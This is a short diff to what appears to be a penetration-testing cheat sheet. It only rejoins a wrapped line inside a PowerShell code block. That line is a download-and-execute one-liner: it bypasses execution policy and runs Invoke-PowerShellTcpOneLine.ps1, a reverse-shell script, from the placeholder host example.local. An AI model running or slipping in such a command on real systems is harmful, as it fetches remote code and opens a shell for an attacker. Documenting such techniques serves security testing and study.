@@ -117,8 +117,7 @@ Or, from cmd.exe to powershell.exe
 
 {% code overflow="wrap" %}
 ```powershell
-powershell.exe -NoP -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString('http://example.local/Invo
-ke-PowerShellTcpOneLine.ps1'))"
+powershell.exe -NoP -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString('http://example.local/Invoke-PowerShellTcpOneLine.ps1'))"
 ```
 {% endcode %}
 
